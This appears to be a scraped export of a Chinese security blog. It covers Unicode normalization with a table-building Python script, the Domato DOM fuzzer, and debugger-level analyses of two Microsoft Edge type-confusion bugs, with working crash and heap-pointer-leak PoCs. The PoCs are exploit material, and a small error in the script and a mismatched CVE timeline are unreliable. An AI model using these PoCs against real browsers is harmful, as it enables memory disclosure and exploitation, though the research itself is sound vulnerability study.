和ａ(\\uff41)在某些字体下看起来可能相同，15和⑮(\\u246e)其表示的数学意义可能相同，所以这两种字符都有其相应的等价性，这种等价性是由人为规定的。更具体的说明可以参考wiki。 转换组成字符的方式有 Normalization Form C 和 Normalization Form KC 两种，它们之间的区别取决于生成的文本是否与原始非标准化文本等效，其中K用于表示兼容性。同理，分解组成字符的方式也有Normalization Form D 和 Normalization Form KD 两种。那么NFC和NFD的区别是什么呢，举例来说，Å(\\u212B)用NFD进行normalize，会变为Å(\\u0041\\u030a)，而NFC处理后则是Å(\\u00c5)。在normalize的时候，会检测字符是否在NFC表中，如果在则进行对应的转换算法。回到之前的问题，\\uff41会被normalize，而\\u0430不被normalize，在请求时因为其中包含unicode字符，所以会被认为是IDN域名。 到此为止，开头的问题已经基本清楚了。在接下来，想构造字符对应的等效码表，来为平时的测试服务。以简单考虑，这里不对icu的代码做深究，一个简单的想法是，对所有字符遍历一次，寻找normalize后相等的字符即可。那么一个简单的获取可打印ascii字符的等效字符的脚本如下： 1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python# -*- coding: utf-8 -*-import jsonfrom unicodedata import normalizedef main(): debug = False tables = &#123;&#125; for i in range(1, 0x10000): src = unichr(i) dst = normalize('NFKC', src)[0] try: if ord(dst) &lt; 128 and dst != src: if debug: print(\"%s (\\\\u%s) -- normalize --&gt; %s (\\\\x%s)\" % ( src, hex(i)[2:].rjust(4, '0'), dst, hex(dst.charAt(0))[2:] )) if dst in tables: tables[dst].append(src) else: tables[dst] = [src] except Exception as e: print(repr(e)) with open(\"nfctable.txt\", \"wb\") as fh: json.dump(tables, fh)if __name__ == '__main__': main()","categories":[{"name":"Misc","slug":"Misc","permalink":"https://LyleMi.github.io/categories/Misc/"}],"tags":[{"name":"Unicode","slug":"Unicode","permalink":"https://LyleMi.github.io/tags/Unicode/"}]},{"title":"Domato - A DOM Fuzzer","slug":"2017-9-27-domato-dom-fuzzer","date":"2017-09-27T01:31:40.000Z","updated":"2020-04-14T12:05:56.545Z","comments":true,"path":"2017/09/27/2017-9-27-domato-dom-fuzzer/","link":"","permalink":"https://LyleMi.github.io/2017/09/27/2017-9-27-domato-dom-fuzzer/","excerpt":"0x00 概述Domato是Google Project Zero的研究员实现的一套DOM Fuzz工具，该Fuzzer挖掘出了30+来自各浏览器的漏洞，是一款比较高效的Fuzzer。 其基本思路和正常的fuzzer一样，也是利用从各个地方抓取的HTML/CSS/JS样本中所包含的语法结构和属性来生成样本。 整个fuzzer大概可以分为以下几个部分： generator.py 根据输入的语法生成样本的引擎 grammar.py 解析参数然后调用基础引擎来生成样本 *.txt 用于生成HTML，CSS，js代码的语法库","text":"0x00 概述Domato是Google Project Zero的研究员实现的一套DOM Fuzz工具，该Fuzzer挖掘出了30+来自各浏览器的漏洞，是一款比较高效的Fuzzer。 其基本思路和正常的fuzzer一样，也是利用从各个地方抓取的HTML/CSS/JS样本中所包含的语法结构和属性来生成样本。 整个fuzzer大概可以分为以下几个部分： generator.py 根据输入的语法生成样本的引擎 grammar.py 解析参数然后调用基础引擎来生成样本 *.txt 用于生成HTML，CSS，js代码的语法库 0x01 代码代码主要完成根据语法生成代码的功能，主要的代码是generator.py和grammar.py，另外的都是语法文件。 语法语法文件是domato的一个重要的部分，这部分作者提到的产生方式为两步。首先从Chrome的源文件中抽取出.idl文件，然后从Chrome的测试文件中提取出了一些常见的HTML和CSS语法。在提取出这些属性之后，还有很大范围的人工的改动，使得这些特征更容易触发bug。 完成后，作者并没有使用常见的json或者xml来定义，而是自己自定义了一种语法格式。其基本的语法是这样的： 1&lt;symbol&gt; = a mix of constants and &lt;other_symbol&gt;s 每一条语法规则都包含一个左值和一个右值，左值是一个符号，右值是符号/常量及其组合。在生成样本时，右值都会递归的展开。 一个最简单的例子如下 1234&lt;cssrule&gt; = &lt;selector&gt; &#123; &lt;declaration&gt; &#125;&lt;selector&gt; = a&lt;selector&gt; = b&lt;declaration&gt; = width:100% 这里可能生成的样本就是 a { width:100% } 或者 b { width:100% } 这里在定义symbol的同时还可以定义一些附加的属性，比如 12&lt;selector p=0.9&gt; = a&lt;selector p=0.1&gt; = b 这里表示a出现的概率为0.1，如果不特别声明，则概率是相差不多的 代码语法用于生成代码的语法和普通的语法相差不大，但是引入了更多的规则来使得可以生成更灵活的脚本。还是看作者给出的例子 1234567!varformat fuzzvar%05d!lineguard try &#123; &lt;line&gt; &#125; catch(e) &#123;&#125;!begin lines&lt;new element&gt; = document.getElementById(&quot;&lt;string min=97 max=122&gt;&quot;);&lt;element&gt;.doSomething();!end lines 调用脚本生成一个5行的样本，得到的结果为 12345try &#123; var00001 = document.getElementById(\"hw\"); &#125; catch(e) &#123;&#125;try &#123; var00001.doSomething(); &#125; catch(e) &#123;&#125;try &#123; var00002 = document.getElementById(\"feezcqbndf\"); &#125; catch(e) &#123;&#125;try &#123; var00002.doSomething(); &#125; catch(e) &#123;&#125;try &#123; var00001.doSomething(); &#125; catch(e) &#123;&#125; 写一个代码的语法规则要注意的是下面这些点： 每一行都由!begin lines和!end lines包裹 这里用了&lt;new element&gt;而不是&lt;element&gt;，表示生成了一个变量 generator.pygenerator.py是主文件，其调用了grammar.py作为库，另外包含一些辅助生成样本的函数，大概的逻辑流程如下： GenerateSamples read template and grammar files add html grammar =&gt; html.txt import css grammar add js grammar =&gt; js.txt import css grammar add css grammar =&gt; css.txt GenerateNewSample with args (template html css js) AddHTMLIDs =&gt; 随机生成一些html元素的id，用于js/css GenerateHTMLElements =&gt; 调用库生成html及css，保存相关信息 GenerateFunctionBody =&gt; 根据之前保存的信息生成js代码 grammar.pygrammar.py实现了一个通用的语法库，也就是说除了该fuzzer，还适用于其他的生成的库。其大概流程如下： ParseFromString =&gt; 读取文件 IncludeFromString =&gt; 保存规则 SaveFunction ParseCodeLine ParseGrammarLine ParseTagAndAttributes NormalizeProbabilities =&gt; 根据概率随机生成样本 GetCDF ComputeInterestingIndices 其调用也比较简单，一个简单的demo如下 12345from grammar import Grammarmy_grammar = Grammar()my_grammar.ParseFromFile('input_file.txt')result_string = my_grammar.GenerateSymbol('symbol_name') 这里就调用input_file.txt中的语法生成了symbol_name中的元素 0x02 参考链接 pj0 blog github","categories":[{"name":"Fuzz","slug":"Fuzz","permalink":"https://LyleMi.github.io/categories/Fuzz/"}],"tags":[{"name":"Browser","slug":"Browser","permalink":"https://LyleMi.github.io/tags/Browser/"}]},{"title":"CVE-2017-8496 Edge Type confusion","slug":"2017-8-14-cve-2017-8496","date":"2017-08-14T01:31:40.000Z","updated":"2020-04-14T12:05:49.362Z","comments":true,"path":"2017/08/14/2017-8-14-cve-2017-8496/","link":"","permalink":"https://LyleMi.github.io/2017/08/14/2017-8-14-cve-2017-8496/","excerpt":"1. Vulnerability Description1.1 The Issue崩溃发生在CAttrArray::PrivateFindInl函数中。 在函数中rcx（this）指针应该指向一个CAttrArray，但它实际上指向一个CAttribute。CAttrArray::PrivateFindInl只会执行读取操作，其返回值将被调用函数（CAttrArray::SetParsed）抛弃。","text":"1. Vulnerability Description1.1 The Issue崩溃发生在CAttrArray::PrivateFindInl函数中。 在函数中rcx（this）指针应该指向一个CAttrArray，但它实际上指向一个CAttribute。CAttrArray::PrivateFindInl只会执行读取操作，其返回值将被调用函数（CAttrArray::SetParsed）抛弃。 1.2 Affect versionWindows 10 Enterprise 64-bit (OS version 1607, OS build 14393.1198)Microsoft Edge 38.14393.1066.0, Microsoft EdgeHTML 14.14393. 1.3 Timeline01/12/2016 Advisory disclosed01/12/2016 +0 days Countermeasure disclosed01/12/2016 +0 days SecurityTracker entry created01/12/2016 +0 days VulnerabilityCenter entry assigned01/13/2016 +1 days VulnerabilityCenter entry created01/14/2016 +1 days VulDB entry created01/17/2016 +3 days VulnerabilityCenter entry updated01/19/2016 +2 days VulDB last update 2. Technical description and PoC2.1 Crash从Google Project Zero的报告中获取的PoC如下 123456789&lt;!-- saved from url=(0014)about:internet --&gt;&lt;script&gt;function go() &#123; window.addEventListener(\"DOMAttrModified\", undefined); m.style.cssText = \"clip-path: url(#foo);\";&#125;&lt;/script&gt;&lt;body onload=go()&gt;&lt;meter id=\"m\" value=\"a\" frame=\"below\"&gt; WinDBG attach到Edge上，运行PoC，发现Crash（注：这里用了一款Edge专用的辅助Debug的工具，可以比较方便的在命令行直接attach到进程上。） 12edgehtml!CAttrArray::PrivateFindInl+0xd6:00007ffa`3b9e04b6 41f644d00380 test byte ptr [r8+rdx*8+3],80h ds:00000003`0005ffbe=?? 可以看出，这里是引用了一个无效的指针，此时的调用栈如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960611:048&gt; k # Child-SP RetAddr Call Site00 00000013`84bfad60 00007ffa`3bbaccc9 edgehtml!CAttrArray::PrivateFindInl+0xd601 00000013`84bfad90 00007ffa`3bb1a68b edgehtml!CAttrArray::SetParsed+0x4902 00000013`84bfae00 00007ffa`3bb1c40c edgehtml!CssParser::RecordProperty+0x24b03 00000013`84bfae70 00007ffa`3bb1b10c edgehtml!CssParser::HandleSingleDeclaration+0x21c04 00000013`84bfaef0 00007ffa`3bae026b edgehtml!CssParser::HandleDeclaration+0x9c05 00000013`84bfaf20 00007ffa`3badedaa edgehtml!CssParser::Write+0x3b06 00000013`84bfaf60 00007ffa`3b93165c edgehtml!ProcessCSSText+0x11207 00000013`84bfafe0 00007ffa`3b94aae3 edgehtml!CStyle::SetCssText+0xbc08 00000013`84bfb020 00007ffa`3bc2ed85 edgehtml!CFastDOM::CCSSStyleDeclaration::Trampoline_Set_cssText+0x7709 00000013`84bfb070 00007ffa`3af6c35b edgehtml!CFastDOM::CCSSStyleDeclaration::Profiler_Set_cssText+0x250a 00000013`84bfb0a0 00007ffa`3af34460 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x16b0b 00000013`84bfb180 00007ffa`3aed6d09 chakra!Js::LeaveScriptObject&lt;1,1,0&gt;::LeaveScriptObject&lt;1,1,0&gt;+0x1800c 00000013`84bfb1d0 00007ffa`3aed44ae chakra!Js::JavascriptOperators::CallSetter+0xa90d 00000013`84bfb270 00007ffa`3aed4be2 chakra!Js::JavascriptOperators::SetProperty_Internal&lt;0&gt;+0x4de0e 00000013`84bfb330 00007ffa`3aed4b1f chakra!Js::JavascriptOperators::OP_SetProperty+0xa20f 00000013`84bfb380 00007ffa`3af8c1fb chakra!Js::JavascriptOperators::PatchPutValueWithThisPtrNoFastPath+0x9f10 00000013`84bfb400 00007ffa`3aec1ca0 chakra!Js::ProfilingHelpers::ProfiledStFld&lt;0&gt;+0x1cb11 00000013`84bfb4d0 00007ffa`3aec6a50 chakra!Js::InterpreterStackFrame::OP_ProfiledSetProperty&lt;Js::OpLayoutT_ElementCP&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; const &gt;+0x7012 00000013`84bfb520 00007ffa`3aec4aa2 chakra!Js::InterpreterStackFrame::ProcessProfiled+0x34013 00000013`84bfb5b0 00007ffa`3aec8b5e chakra!Js::InterpreterStackFrame::Process+0x14214 00000013`84bfb610 00007ffa`3aeca265 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x48e15 00000013`84bfb950 00000176`dcdc0fb2 chakra!Js::InterpreterStackFrame::InterpreterThunk+0x5516 00000013`84bfb9a0 00007ffa`3aff1393 0x00000176`dcdc0fb217 00000013`84bfb9d0 00007ffa`3aebd873 chakra!amd64_CallFunction+0x9318 00000013`84bfba20 00007ffa`3aec0490 chakra!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x8319 00000013`84bfba80 00007ffa`3aec4f4d chakra!Js::InterpreterStackFrame::OP_CallI&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallI&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; &gt;+0x1101a 00000013`84bfbad0 00007ffa`3aec4b07 chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x32d1b 00000013`84bfbb60 00007ffa`3aec8b5e chakra!Js::InterpreterStackFrame::Process+0x1a71c 00000013`84bfbbc0 00007ffa`3aeca265 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x48e1d 00000013`84bfbf00 00000176`dcdc0fba chakra!Js::InterpreterStackFrame::InterpreterThunk+0x551e 00000013`84bfbf50 00007ffa`3aff1393 0x00000176`dcdc0fba1f 00000013`84bfbf80 00007ffa`3aebd873 chakra!amd64_CallFunction+0x9320 00000013`84bfbfd0 00007ffa`3af2c2ec chakra!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x8321 00000013`84bfc030 00007ffa`3af2b8b6 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x10422 00000013`84bfc120 00007ffa`3afd6259 chakra!Js::JavascriptFunction::CallRootFunction+0x4a23 00000013`84bfc190 00007ffa`3af31d41 chakra!ScriptSite::CallRootFunction+0xb524 00000013`84bfc230 00007ffa`3af2d8fc chakra!ScriptSite::Execute+0x13125 00000013`84bfc2c0 00007ffa`3bb3278d chakra!ScriptEngineBase::Execute+0xcc26 00000013`84bfc360 00007ffa`3bb326d8 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d27 00000013`84bfc3b0 00007ffa`3bb431f7 edgehtml!CJScript9Holder::ExecuteCallback+0x1828 00000013`84bfc3f0 00007ffa`3bb42fe7 edgehtml!CListenerDispatch::InvokeVar+0x1fb29 00000013`84bfc570 00007ffa`3bb310da edgehtml!CListenerDispatch::Invoke+0xdb2a 00000013`84bfc5f0 00007ffa`3bbc1602 edgehtml!CEventMgr::_InvokeListeners+0x2ca2b 00000013`84bfc750 00007ffa`3ba9a495 edgehtml!CEventMgr::_InvokeListenersOnWindow+0x662c 00000013`84bfc780 00007ffa`3ba99f23 edgehtml!CEventMgr::Dispatch+0x4052d 00000013`84bfca50 00007ffa`3bad00c2 edgehtml!CEventMgr::DispatchEvent+0x732e 00000013`84bfcaa0 00007ffa`3bb0296a edgehtml!COmWindowProxy::Fire_onload+0x14e2f 00000013`84bfcbb0 00007ffa`3bb01596 edgehtml!CMarkup::OnLoadStatusDone+0x37630 00000013`84bfcc70 00007ffa`3bb46d7f edgehtml!CMarkup::OnLoadStatus+0x11231 00000013`84bfcca0 00007ffa`3bb2859d edgehtml!CProgSink::DoUpdate+0x3af32 00000013`84bfd130 00007ffa`3bb29d70 edgehtml!GlobalWndOnMethodCall+0x24d33 00000013`84bfd230 00007ffa`593e1c24 edgehtml!GlobalWndProc+0x13034 00000013`84bfd2f0 00007ffa`593e156c user32!UserCallWinProcCheckWow+0x27435 00000013`84bfd450 00007ffa`380ec781 user32!DispatchMessageWorker+0x1ac36 00000013`84bfd4d0 00007ffa`380eec41 EdgeContent!CBrowserTab::_TabWindowThreadProc+0x4a137 00000013`84bff720 00007ffa`4f7b9266 EdgeContent!LCIETab_ThreadProc+0x2c138 00000013`84bff840 00007ffa`59d98364 iertutil!SettingStore::CSettingsBroker::SetValue+0x24639 00000013`84bff870 00007ffa`59f55e91 KERNEL32!BaseThreadInitThunk+0x143a 00000013`84bff8a0 00000000`00000000 ntdll!RtlUserThreadStart+0x21 寄存器的值如下 1234567891:048&gt; rrax=0000000000003ffd rbx=0000000000000002 rcx=00000176d9804cf0rdx=000000000000bff7 rsi=0000000000003ffd rdi=0000000000000000rip=00007ffa3b9e04b6 rsp=0000001384bfad60 rbp=0000000000000002 r8=0000000300000003 r9=00000000800114a4 r10=0000000000000000r11=0000000000007ffa r12=00000176d9a9c680 r13=00000176d9734b01r14=00000176d9804c88 r15=0000000000000000iopl=0 nv up ei pl nz na pe nccs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010202 在ida中查看相关的代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139int __fastcall CAttrArray::PrivateFindInl(__int64 this, int a2, signed int CAttrValue__AATYPE)&#123; signed int v3; // edi@1 signed int v4; // er10@1 int v5; // er9@1 __int64 this_add_4; // r11@4 __int64 this_add_8; // r8@4 signed int v8; // ebx@4 unsigned __int64 v9; // rax@7 signed __int64 v10; // rdx@7 unsigned __int64 v11; // r11@8 int v12; // ecx@10 signed int v13; // ecx@16 __int64 v14; // rsi@22 int v15; // ecx@23 signed int v16; // ecx@34 signed int v17; // esi@38 signed __int64 v18; // rdx@38 int v19; // ecx@40 int v21; // [sp+38h] [bp+10h]@20 v3 = 0; v4 = CAttrValue__AATYPE; v5 = a2; if ( CAttrValue__AATYPE == 6 ) v4 = 0; if ( a2 == -1 ) &#123; v21 = -1; LODWORD(v9) = CAttrArray::PrivateFindLinear(this, (unsigned int)v4, &amp;v21, 0xFFFFFFFFi64); &#125; else &#123; this_add_4 = *(_DWORD *)(this + 4); this_add_8 = *(_QWORD *)(this + 8); v8 = 2; if ( v4 &gt; 2 ) v8 = v4; if ( (signed int)this_add_4 &lt; 11 ) &#123; v9 = *(_QWORD *)(this + 8); v10 = 3 * this_add_4; goto LABEL_8; &#125; if ( (signed int)this_add_4 &gt; 0 ) &#123; while ( 1 ) &#123; v14 = ((signed int)this_add_4 + v3) / 2; v9 = this_add_8 + 24 * v14; if ( *(_BYTE *)(this_add_8 + 24 * v14 + 3) &amp; 0x80 )// vuln v15 = *(_DWORD *)(v9 + 8); else v15 = *(_DWORD *)(*(_QWORD *)(v9 + 8) + 48i64); if ( a2 &lt; v15 ) &#123; LODWORD(this_add_4) = ((signed int)this_add_4 + v3) / 2; goto LABEL_26; &#125; if ( a2 &gt; v15 ) goto LABEL_30; v16 = *(_BYTE *)v9; if ( v4 == v16 ) return v9; if ( v8 &gt;= v16 ) break; LODWORD(this_add_4) = ((signed int)this_add_4 + v3) / 2;LABEL_26: if ( (signed int)this_add_4 - v3 &lt; 10 ) &#123; v9 = this_add_8 + 24i64 * v3; goto LABEL_28; &#125; if ( v3 &gt;= (signed int)this_add_4 ) goto LABEL_19; &#125; if ( v8 == 2i64 ) &#123; v17 = v14 - 1; v18 = v9 - 24; if ( v17 &gt;= v3 ) &#123; while ( 1 ) &#123; v19 = *(_BYTE *)(v18 + 3) &amp; 0x80 ? *(_DWORD *)(v18 + 8) : *(_DWORD *)(*(_QWORD *)(v18 + 8) + 48i64); if ( v5 != v19 ) break; if ( v4 == *(_BYTE *)v18 ) &#123; LODWORD(v9) = v18; return v9; &#125; if ( v17 != v3 ) &#123; v18 -= 24i64; if ( --v17 &gt;= v3 ) continue; &#125; break; &#125; &#125;LABEL_28: v10 = 3i64 * (signed int)this_add_4;LABEL_8: v11 = this_add_8 + 8 * v10; if ( v9 &lt; v11 ) &#123; while ( 1 ) &#123; if ( *(_BYTE *)(v9 + 3) &amp; 0x80 ) v12 = *(_DWORD *)(v9 + 8); else v12 = *(_DWORD *)(*(_QWORD *)(v9 + 8) + 48i64); if ( v12 &gt;= v5 ) &#123; if ( v12 != v5 ) goto LABEL_19; v13 = *(_BYTE *)v9; if ( v13 == v4 ) return v9; if ( v13 &gt; v8 ) goto LABEL_19; &#125; v9 += 24i64; if ( v9 &gt;= v11 ) goto LABEL_19; &#125; &#125; goto LABEL_19; &#125;LABEL_30: v3 = v14 + 1; goto LABEL_26; &#125;LABEL_19: LODWORD(v9) = 0; &#125; return v9;&#125; 其中引发问题的指令是 1if ( *(_BYTE *)(this_add_8 + 24 * v14 + 3) &amp; 0x80 ) 其中this_add_8变量对应的是 rcx+8 那么先查看下rcx的值 12345678910111213141516171:048&gt; dps rcx00000176`d9804cf0 00007ffa`3c562d38 edgehtml!CAttribute::`vftable&apos;00000176`d9804cf8 00000003`0000000300000176`d9804d00 00000000`0000000800000176`d9804d08 00000000`0000000000000176`d9804d10 00000000`0000000000000176`d9804d18 00000176`dcc1815000000176`d9804d20 00007ffa`3c55fae0 edgehtml!s_propdescCElementstyle_Str00000176`d9804d28 00000000`800103eb00000176`d9804d30 00000176`d9a742f400000176`d9804d38 00000000`0000000000000176`d9804d40 00000000`0000000000000176`d9804d48 00000000`0000000000000176`d9804d50 00000176`d982850000000176`d9804d58 00000176`d98a858000000176`d9804d60 00000176`d9850c0000000176`d9804d68 00000176`d983c330 这里rcx是this指针，在CAttrArray::PrivateFindInl这个类的函数中应该是一个CAttrArray对象的this指针，可是这里rcx存了一个CAttribute的虚表对象，也就是说，在之前有一个错误的调用。 那么根据调用栈继续上溯，我们可以看到CAttrArray::SetParsed函数，调用PrivateFindInl的代码如下 123456if ( v6 || (v8 = *a1) == 0i64 || (LODWORD(v9) = CAttrArray::PrivateFindInl((__int64)v8, a2, 0), !v9) )&#123; v11 = v4; v10 = 31; CAttrArray::Set(v7, (unsigned int)v5, &amp;v10, 0i64);&#125; 也就是说这里如果该函数返回错误的值，那么CAttrArray::Set将不会执行。 继续向上回溯，查看CssParser::RecordProperty函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167void __fastcall CssParser::RecordProperty(CssParser *this, struct CssTokenizer *a2, __int32 a3, char a4, bool a5)&#123; char v5; // si@1 __int32 v6; // edi@1 struct CssTokenizer *v7; // r14@1 CssParser *v8; // rbp@1 CBase *v9; // rcx@3 char v10; // bl@4 bool v11; // r15@4 bool v12; // al@6 char v13; // r13@9 unsigned __int8 v14; // bl@10 MemoryProtection *v15; // rsi@11 const unsigned __int16 *v16; // r12@11 __int32 v17; // er8@13 __int64 v18; // rcx@18 const unsigned __int16 *v19; // rdi@18 unsigned __int64 v20; // rsi@18 __int64 v21; // rax@18 __int16 v22; // ax@24 unsigned __int64 v23; // r14@30 signed __int64 v24; // r14@31 const struct PROPERTYDESC *v25; // rax@37 int v26; // er10@37 CDoc *v27; // rax@44 const unsigned __int16 *v28; // rdx@51 unsigned __int16 *v29[2]; // [sp+20h] [bp-48h]@4 __int64 v30; // [sp+30h] [bp-38h]@4 __int32 v31; // [sp+80h] [bp+18h]@1 v31 = a3; v5 = a4; v6 = a3; v7 = a2; v8 = this; if ( *((_UNKNOWN **)this + 22) == &amp;CCSSStyleDeclaration::s_apHdlDescs &amp;&amp; *((_QWORD *)this + 2) ) &#123; v9 = (CBase *)*((_QWORD *)this + 23); if ( !v9 ) &#123;LABEL_4: v10 = 0; v30 = 0i64; _mm_storeu_si128((__m128i *)v29, 0i64); v11 = v6 == -1; v12 = v5 || v11; if ( a5 || v12 ) &#123; v13 = 1; if ( v12 ) v10 = -128; &#125; else &#123; v13 = 0; &#125; v14 = v10 | 8; if ( !v13 ) &#123;LABEL_11: v15 = (MemoryProtection *)v29[0]; v16 = &amp;g_szEmpty; if ( v11 ) &#123; if ( v29[0] ) v28 = v29[0]; else v28 = &amp;g_szEmpty; if ( CssParser::GetExpandoDispID(v8, v28, &amp;v31) ) &#123;LABEL_15: if ( v15 ) MemoryProtection::HeapFree(v15, (void *)a2); return; &#125; v6 = v31; &#125; if ( v6 != -1 ) &#123; v17 = *((_DWORD *)v8 + 7) + 1; if ( (unsigned int)v17 &gt; *((_DWORD *)v8 + 6) &gt;&gt; 2 ) &#123; if ( v17 &lt; 0 ) &#123; Abandonment::InvalidArguments(); JUMPOUT(*(_QWORD *)&amp;byte_18042A78B); &#125; CImplAry::EnsureSizeWorker((CssParser *)((char *)v8 + 24), 4ui64, v17); &#125; *(_DWORD *)(*((_QWORD *)v8 + 4) + 4i64 * (*((_DWORD *)v8 + 7))++) = v6; if ( v13 ) &#123; if ( v11 ) &#123; CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v31, &amp;pwzURI, v14); &#125; else &#123; v25 = GetStandardPropDescFromAliasDISPID(v31); if ( v25 ) v26 = *((_DWORD *)v25 + 12); if ( v15 ) v16 = (const unsigned __int16 *)v15; CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v26, v16, v14); &#125; &#125; &#125; goto LABEL_15; &#125; v18 = *((_QWORD *)v7 + 1); v19 = (const unsigned __int16 *)*((_QWORD *)v7 + 5); v20 = v18 + 2i64 * *((_DWORD *)v7 + 5); v21 = *((_DWORD *)v7 + 4); if ( v20 &gt; v18 + 2 * v21 ) v20 = v18 + 2 * v21; if ( !v11 ) &#123; if ( (unsigned __int64)v19 &gt;= v20 ) &#123;LABEL_31: v24 = (signed __int64)(v20 - (_QWORD)v19) &gt;&gt; 1; if ( !v11 &amp;&amp; (unsigned int)v24 &gt;= 0xA &amp;&amp; !StrCmpNICW(v20 - 20, L\"!important\", 10i64) ) &#123; LODWORD(v24) = v24 - 10; v14 |= 2u; &#125; CBuffer::Append((CBuffer *)v29, v19, v24); CBuffer::TrimTrailingWhitespace((CBuffer *)v29); v6 = v31; goto LABEL_11; &#125; if ( 58 == *v19 ) ++v19; v22 = *(_WORD *)(v20 - 2); if ( v22 == 59 || !v22 || v22 == 125 ) v20 -= 2i64; &#125; if ( (unsigned __int64)v19 &lt; v20 ) &#123; while ( IsCharSpaceW(*v19) ) &#123; ++v19; if ( (unsigned __int64)v19 &gt;= v20 ) goto LABEL_31; &#125; if ( (unsigned __int64)v19 &lt; v20 ) &#123; do &#123; v23 = v20 - 2; if ( !IsCharSpaceW(*(_WORD *)(v20 - 2)) ) break; v20 -= 2i64; &#125; while ( (unsigned __int64)v19 &lt; v23 ); &#125; &#125; goto LABEL_31; &#125; v27 = CBase::GetCDoc(v9); if ( !v27 || CDoc::CheckCSSDiagnosticsAvailability(v27) ) &#123; v6 = v31; goto LABEL_4; &#125; &#125;&#125; CAttrArray::SetParsed的调用在下面两句： 1CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v31, &amp;pwzURI, v14); 1CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v26, v16, v14); 这里v8是this指针，也就是说在这里发生了一次错误的调用，本来应该传入的是CAttrArray，但是传入了一个CAttribute，造成了Type confusion 3. References1. project-zero 2. nvd 3. cve 4. seebug","categories":[{"name":"Misc","slug":"Misc","permalink":"https://LyleMi.github.io/categories/Misc/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://LyleMi.github.io/tags/CVE/"}]},{"title":"CVE-2016-0003 Edge Type Confusion","slug":"2017-8-11-cve-2016-0003","date":"2017-08-11T01:31:40.000Z","updated":"2020-04-14T12:05:39.229Z","comments":true,"path":"2017/08/11/2017-8-11-cve-2016-0003/","link":"","permalink":"https://LyleMi.github.io/2017/08/11/2017-8-11-cve-2016-0003/","excerpt":"1. Vulnerability Description1.1 The IssueMS Edge CDOMTextNode::get_data type confusion 特别构造的JavaScript脚本可以触发Microsoft Edge的type confusion，使得可以像访问字符串一样访问C++对象。 这可能导致信息泄露，例如允许攻击者确定指向其他对象或函数的指针的值。","text":"1. Vulnerability Description1.1 The IssueMS Edge CDOMTextNode::get_data type confusion 特别构造的JavaScript脚本可以触发Microsoft Edge的type confusion，使得可以像访问字符串一样访问C++对象。 这可能导致信息泄露，例如允许攻击者确定指向其他对象或函数的指针的值。 1.2 Affect versionMicrosoft Edge 20.10240.16384.0 1.3 Timeline01/12/2016 Advisory disclosed01/12/2016 +0 days Countermeasure disclosed01/12/2016 +0 days SecurityTracker entry created01/12/2016 +0 days VulnerabilityCenter entry assigned01/13/2016 +1 days VulnerabilityCenter entry created01/14/2016 +1 days VulDB entry created01/17/2016 +3 days VulnerabilityCenter entry updated01/19/2016 +2 days VulDB last update 2. Technical description and PoC2.1 Description在DOM树中将一个节点作为子节点加到另一个节点时，Edge首先从其父节点中删除该节点，触发DOMNodeRemoved事件，然后重新附加该节点作为另一个节点的最后一个子节点。而在DOMNodeRemoved事件发生时，JavaScript的事件处理器可以更改DOM树，我们尝试在触发DOMNodeRemoved事件时向同一个父节点插入另一个文本子节点，这个操作在事件期间完成，因此该文本子节点在触发事件的节点之前作为子节点附加。而在触发DOMNodeRemoved事件处理程序之前，代码似乎确定了节点应该被附加的位置，因此最开始插入的节点在父文本节点之前而不是之后被插入。因为bug的存在，在完成所有这些操作后，DOM树已被破坏。这可以通过检查文本节点的.nextSibling属性是文本节点本身来确认, 即DOM树中有一个循环。另一个效果是，读取文本节点的nodeValue将导致类型混淆。这里Edge访问文本节点中存储的文本数据时，实际访问的却是一个C++对象。这样可以让攻击者读取存储在这个C++对象中的数据，其中包含各种指针。 2.2 JavaScript PoCSkylined给出了一个读取并显示DOM树对象的部分内容的PoC。该PoC已经在x64系统上进行了测试，允许攻击者绕过堆ASLR，读取堆指针。 读取的数据量可以由攻击者控制，并且可以读取分配给C++对象的内存之外的数据。攻击者可能能够使用一些堆的技巧将其他对象与C++DOM树对象中的有用信息放置在内存中，并从第二个对象读取数据。 exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;html&gt; &lt;head&gt; &lt;script&gt; var uNodeRemovedEvents = 0; onerror = function (sError, sSource, uLine)&#123; alert(sError + \" on line \" + uLine); &#125;; document.addEventListener(\"DOMNodeRemoved\", function(oEvent) &#123; if (uNodeRemovedEvents++ == 0) &#123; oTextNode = document.createTextNode(\"[2]\"); // 这里有一个需要注意的地方 // insertBefore在Edge中如果没有第二个参数，那么等同于appendChild // 但是其他浏览器是不支持的 // 作者这里用insertBefore是为了更好的去判断是否有一个堆因为此处操作被allocated // 用于和之后的appendChild调用区分开 document.body.insertBefore(oTextNode); &#125;; &#125;, true); onload = function()&#123; // onload中首先执行的是appendChild // 这里oExistingChild已经有了父节点，所以会先从父节点移除这个元素，然后把它作为新父节点的最后一个子节点 // 其中移除操作会触发DOMNodeRemoved事件，而增加操作会触发DOMNodeInserted事件。 document.body.appendChild(oExistingChild); // 但是，在oExistingChild触发DOMNodeRemoved事件时， // oTextNode插入了节点中 // 